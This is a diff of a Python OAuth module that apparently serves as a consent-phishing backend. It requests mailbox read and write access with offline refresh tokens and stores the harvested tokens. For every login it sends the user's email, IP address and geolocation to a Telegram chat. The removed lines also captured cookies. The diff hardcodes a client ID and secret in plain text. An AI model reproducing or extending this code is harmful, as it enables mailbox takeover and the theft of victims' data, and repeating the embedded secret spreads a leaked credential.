@@ -1,4 +1,3 @@
-# auth.py
 from db import SessionLocal
 from models import TenantToken
 from datetime import datetime, timedelta
@@ -9,29 +8,26 @@ import os
 # =========================
 # CONFIG
 # =========================
-CLIENT_ID = os.environ.get("CLIENT_ID", "3d3d5a12-09a4-4163-bab2-0188bf65ddd1")
-CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "bqc8Q~Y_Au9DwR6.pBp9Jh.cZKXWIuTQrfafkam-")
-REDIRECT_URI = os.environ.get(
-    "REDIRECT_URI", "https://oauth-backend-7cuu.onrender.com/auth/callback"
-)
+CLIENT_ID = "3d3d5a12-09a4-4163-bab2-0188bf65ddd1"
+CLIENT_SECRET = "bqc8Q~Y_Au9DwR6.pBp9Jh.cZKXWIuTQrfafkam-"
+REDIRECT_URI = "https://oauth-backend-7cuu.onrender.com/auth/callback"
 TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
 
-# Telegram alerts
+# Telegram (use environment variables)
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
 # =========================
 # TOKEN STORAGE
 # =========================
-def save_token(user_id, token_data, cookies=None):
+def save_token(user_id, token_data):
     db = SessionLocal()
     expires_at = int((datetime.utcnow() + timedelta(seconds=token_data["expires_in"])).timestamp())
     record = TenantToken(
         tenant_id=user_id,
         access_token=token_data["access_token"],
         refresh_token=token_data.get("refresh_token"),
-        expires_at=expires_at,
-        cookies=cookies  # optional field in your TenantToken model
+        expires_at=expires_at
     )
     db.merge(record)
     db.commit()
@@ -44,12 +40,14 @@ def get_token(user_id):
     db.close()
     return token
 
+
 # =========================
 # LOGIN LINK GENERATION
 # =========================
 def generate_login_link(user_id_or_tenant: str):
     base_url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
     state = quote_plus(user_id_or_tenant)
+    
     params = {
         "client_id": CLIENT_ID,
         "response_type": "code",
@@ -58,7 +56,9 @@ def generate_login_link(user_id_or_tenant: str):
         "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
         "state": state
     }
+    
     return f"{base_url}?{urlencode(params)}"
+
 
 # =========================
 # TELEGRAM ALERT
@@ -73,10 +73,14 @@ def send_telegram_alert(message: str):
     except Exception as e:
         print(f"Failed to send Telegram alert: {e}")
 
+
 # =========================
 # TOKEN EXCHANGE
 # =========================
 def exchange_code_for_token(code: str, user_id: str, client_ip: str = None):
+    """
+    Exchange authorization code for access token and send Telegram alert with email, IP, location.
+    """
     data = {
         "client_id": CLIENT_ID,
         "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
@@ -86,49 +90,43 @@ def exchange_code_for_token(code: str, user_id: str, client_ip: str = None):
         "client_secret": CLIENT_SECRET
     }
 
-    # Exchange code
     response = requests.post(TOKEN_URL, data=data)
     result = response.json()
 
     if "error" in result:
         raise Exception(f"Token exchange failed: {result['error_description']}")
 
-    # Capture cookies if returned
-    cookies = response.cookies.get_dict() if response.cookies else None
-    save_token(user_id, result, cookies=cookies)
+    save_token(user_id, result)
 
-    # Fetch user email
+    # Fetch user's email from Microsoft Graph
     headers = {"Authorization": f"Bearer {result['access_token']}"}
     try:
         graph_resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
-        graph_resp.raise_for_status()
         email = graph_resp.json().get("userPrincipalName", "unknown")
-    except Exception:
+    except:
         email = "unknown"
 
-    # Fetch location from IP
+    # Get location info if IP is provided
     location = {}
     if client_ip:
         try:
             loc_resp = requests.get(f"https://ipinfo.io/{client_ip}/json")
             if loc_resp.ok:
                 location = loc_resp.json()
-        except Exception:
+        except:
             location = {}
 
-    # Telegram alert
+    # Send Telegram alert
     message = (
         f"User ID: {user_id}\n"
         f"Email: {email}\n"
         f"IP: {client_ip or 'unknown'}\n"
-        f"Location: {location.get('city', 'N/A')}, "
-        f"{location.get('region', 'N/A')}, "
-        f"{location.get('country', 'N/A')}\n"
-        f"Cookies captured: {bool(cookies)}"
+        f"Location: {location.get('city')}, {location.get('region')}, {location.get('country')}"
     )
     send_telegram_alert(message)
 
     return result
+
 
 # =========================
 # TOKEN REFRESH
